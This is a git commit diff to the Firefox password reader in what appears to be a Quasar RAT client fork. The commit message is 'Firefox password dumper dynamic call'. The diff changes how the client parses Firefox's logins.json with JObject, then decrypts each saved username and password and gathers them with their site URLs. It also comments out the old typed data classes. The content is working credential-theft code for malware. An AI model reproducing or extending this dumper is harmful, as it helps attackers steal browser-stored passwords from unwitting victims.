d6d455a1dcda9e691a4bb9c6f8ab8eb6904b233e
eric0210 <77634181+hsheric0210@users.noreply.github.com>
2023-04-18 21:48:37 +0900

    Firefox password dumper dynamic call

--- Quasar.Client/Recovery/Browsers/FirefoxPassReader.cs
+++ Quasar.Client/Recovery/Browsers/FirefoxPassReader.cs
@@ -1,10 +1,13 @@
-﻿using Quasar.Client.Helper;
+﻿using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
+using Quasar.Client.Helper;
 using Quasar.Client.Recovery.Utilities;
 using Quasar.Common.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Runtime.Serialization;
+using System.Text;
 
 namespace Quasar.Client.Recovery.Browsers
 {
@@ -31,7 +34,7 @@ namespace Quasar.Client.Recovery.Browsers
 
                 string[] files = Directory.GetFiles(dir, "signons.sqlite");
                 if (files.Length > 0)
-				{
+                {
                     signonsFile = files[0];
                     signonsFound = true;
                 }
@@ -96,21 +99,29 @@ namespace Quasar.Client.Recovery.Browsers
 
                         if (loginsFound)
                         {
-                            FFLogins ffLoginData;
+                            JArray ffLoginData;
                             using (var sr = File.OpenRead(loginsFile))
                             {
-                                ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
+                                using (var tr = new StreamReader(sr, encoding: new UTF8Encoding(false)))
+                                {
+                                    using (var jr = new JsonTextReader(tr))
+                                    {
+                                        var obj = (JObject)JToken.ReadFrom(jr);
+                                        ffLoginData = (JArray)obj["logins"];
+                                        //ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
+                                    }
+                                }
                             }
 
-                            foreach (Login loginData in ffLoginData.Logins)
+                            foreach (var loginData in ffLoginData.Values())
                             {
-                                string username = decrypter.Decrypt(loginData.EncryptedUsername);
-                                string password = decrypter.Decrypt(loginData.EncryptedPassword);
+                                string username = decrypter.Decrypt(loginData["encryptedUsername"].ToString());
+                                string password = decrypter.Decrypt(loginData["encryptedPassword"].ToString());
                                 logins.Add(new RecoveredAccount
                                 {
                                     Username = username,
                                     Password = password,
-                                    Url = loginData.Hostname.ToString(),
+                                    Url = loginData["hostname"].ToString(),
                                     Application = ApplicationName
                                 });
                             }
@@ -123,76 +134,76 @@ namespace Quasar.Client.Recovery.Browsers
             return logins;
         }
 
-        [DataContract]
-        private class FFLogins
-        {
-            [DataMember(Name = "nextId")]
-            public long NextId { get; set; }
-
-            [DataMember(Name = "logins")]
-            public Login[] Logins { get; set; }
-
-            [IgnoreDataMember]
-            [DataMember(Name = "potentiallyVulnerablePasswords")]
-            public object[] PotentiallyVulnerablePasswords { get; set; }
-
-            [IgnoreDataMember]
-            [DataMember(Name = "dismissedBreachAlertsByLoginGUID")]
-            public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }
-
-            [DataMember(Name = "version")]
-            public long Version { get; set; }
-        }
-
-        [DataContract]
-        private class DismissedBreachAlertsByLoginGuid
-        {
-        }
-
-        [DataContract]
-        private class Login
-        {
-            [DataMember(Name = "id")]
-            public long Id { get; set; }
-
-            [DataMember(Name = "hostname")]
-            public Uri Hostname { get; set; }
-
-            [DataMember(Name = "httpRealm")]
-            public object HttpRealm { get; set; }
-
-            [DataMember(Name = "formSubmitURL")]
-            public Uri FormSubmitUrl { get; set; }
-
-            [DataMember(Name = "usernameField")]
-            public string UsernameField { get; set; }
-
-            [DataMember(Name = "passwordField")]
-            public string PasswordField { get; set; }
-
-            [DataMember(Name = "encryptedUsername")]
-            public string EncryptedUsername { get; set; }
-
-            [DataMember(Name = "encryptedPassword")]
-            public string EncryptedPassword { get; set; }
-
-            [DataMember(Name = "guid")]
-            public string Guid { get; set; }
-
-            [DataMember(Name = "encType")]
-            public long EncType { get; set; }
-
-            [DataMember(Name = "timeCreated")]
-            public long TimeCreated { get; set; }
-
-            [DataMember(Name = "timeLastUsed")]
-            public long TimeLastUsed { get; set; }
-
-            [DataMember(Name = "timePasswordChanged")]
-            public long TimePasswordChanged { get; set; }
-
-            [DataMember(Name = "timesUsed")]
-            public long TimesUsed { get; set; }
-        }
+        //[DataContract]
+        //private class FFLogins
+        //{
+        //    [DataMember(Name = "nextId")]
+        //    public long NextId { get; set; }
+        //
+        //    [DataMember(Name = "logins")]
+        //    public Login[] Logins { get; set; }
+        //
+        //    [IgnoreDataMember]
+        //    [DataMember(Name = "potentiallyVulnerablePasswords")]
+        //    public object[] PotentiallyVulnerablePasswords { get; set; }
+        //
+        //    [IgnoreDataMember]
+        //    [DataMember(Name = "dismissedBreachAlertsByLoginGUID")]
+        //    public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }
+        //
+        //    [DataMember(Name = "version")]
+        //    public long Version { get; set; }
+        //}
+        //
+        //[DataContract]
+        //private class DismissedBreachAlertsByLoginGuid
+        //{
+        //}
+        //
+        //[DataContract]
+        //private class Login
+        //{
+        //    [DataMember(Name = "id")]
+        //    public long Id { get; set; }
+        //
+        //    [DataMember(Name = "hostname")]
+        //    public Uri Hostname { get; set; }
+        //
+        //    [DataMember(Name = "httpRealm")]
+        //    public object HttpRealm { get; set; }
+        //
+        //    [DataMember(Name = "formSubmitURL")]
+        //    public Uri FormSubmitUrl { get; set; }
+        //
+        //    [DataMember(Name = "usernameField")]
+        //    public string UsernameField { get; set; }
+        //
+        //    [DataMember(Name = "passwordField")]
+        //    public string PasswordField { get; set; }
+        //
+        //    [DataMember(Name = "encryptedUsername")]
+        //    public string EncryptedUsername { get; set; }
+        //
+        //    [DataMember(Name = "encryptedPassword")]
+        //    public string EncryptedPassword { get; set; }
+        //
+        //    [DataMember(Name = "guid")]
+        //    public string Guid { get; set; }
+        //
+        //    [DataMember(Name = "encType")]
+        //    public long EncType { get; set; }
+        //
+        //    [DataMember(Name = "timeCreated")]
+        //    public long TimeCreated { get; set; }
+        //
+        //    [DataMember(Name = "timeLastUsed")]
+        //    public long TimeLastUsed { get; set; }
+        //
+        //    [DataMember(Name = "timePasswordChanged")]
+        //    public long TimePasswordChanged { get; set; }
+        //
+        //    [DataMember(Name = "timesUsed")]
+        //    public long TimesUsed { get; set; }
+        //}
     }
 }
